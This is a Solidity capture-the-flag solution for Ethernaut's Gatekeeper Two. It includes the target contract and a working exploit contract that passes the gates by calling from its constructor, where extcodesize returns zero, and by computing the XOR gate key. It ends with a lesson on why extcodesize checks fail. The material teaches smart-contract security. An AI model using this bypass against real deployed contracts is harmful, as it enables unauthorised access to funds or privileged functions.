// Ethernaut Challenge #14: Gatekeeper Two
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * GATEKEEPER TWO CHALLENGE
 * 
 * Goal: Pass through three gates and become the entrant.
 * 
 * GATE ONE: msg.sender != tx.origin
 * - Same as Gatekeeper One
 * - Call from contract, not EOA
 * 
 * GATE TWO: assembly { x := extcodesize(caller()) }
 *           require(x == 0)
 * - extcodesize returns the code size at an address
 * - For normal contracts, this is > 0
 * - TRICK: During a contract's constructor, code isn't deployed yet
 * - So extcodesize(address) == 0 while in constructor
 * 
 * GATE THREE: XOR with key
 * - require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)
 * - XOR with all 1s (type(uint64).max) is effectively bitwise NOT
 * - So: gateKey = ~uint64(hash)
 * - Or: gateKey = uint64(hash) ^ type(uint64).max
 */

contract GatekeeperTwoExploit {
    GatekeeperTwo public target;
    
    // CRITICAL: All work happens in constructor!
    // During constructor, extcodesize(this) == 0
    constructor(address _target) {
        target = GatekeeperTwo(_target);
        
        // Calculate gateKey: XOR of hash with all 1s = NOT
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 
            type(uint64).max
        );
        
        // Gate 1: msg.sender = this contract, tx.origin = EOA ✓
        // Gate 2: extcodesize(this) == 0 during constructor ✓
        // Gate 3: gateKey calculated correctly ✓
        target.enter(gateKey);
    }
}

contract GatekeeperTwo {
    address public entrant;
    
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
    
    modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
    }
    
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
            uint64(_gateKey) == type(uint64).max
        );
        _;
    }
    
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. Deploy GatekeeperTwoExploit with target address
 * 2. During construction:
 *    - extcodesize(address(this)) == 0 (passes gate two!)
 *    - Calculate gateKey = hash ^ 0xFFFFFFFFFFFFFFFF
 *    - Call target.enter(gateKey)
 * 3. Deployment completes, entrant is set
 * 
 * WHY IT WORKS:
 * - extcodesize returns 0 for addresses with no code
 * - During construction, contract has no deployed code yet
 * - This is a known edge case in the EVM
 * 
 * LESSON:
 * - extcodesize == 0 doesn't guarantee EOA (Externally Owned Account)
 * - Contracts can have zero code size during construction
 * - Don't rely on extcodesize for authentication
 * 
 * ALTERNATIVE: Check codesize AND that caller has no code, 
 * but this can be bypassed with CREATE2 and specific patterns.
 */
